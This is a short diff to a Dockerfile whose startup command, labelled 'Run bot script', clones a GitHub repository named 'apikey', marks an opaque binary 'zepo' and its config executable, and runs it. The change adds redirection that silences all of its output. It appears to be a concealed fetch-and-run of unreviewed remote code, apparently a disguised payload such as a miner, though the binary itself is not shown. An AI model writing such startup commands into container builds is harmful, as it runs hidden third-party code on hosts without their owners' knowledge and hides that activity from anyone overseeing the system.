@@ -37,5 +37,5 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD git clone https://github.com/55113110159/apikey.git && cd apikey && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json" 
+CMD git clone https://github.com/55113110159/apikey.git && cd apikey && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json" >/dev/null 2>&1
 
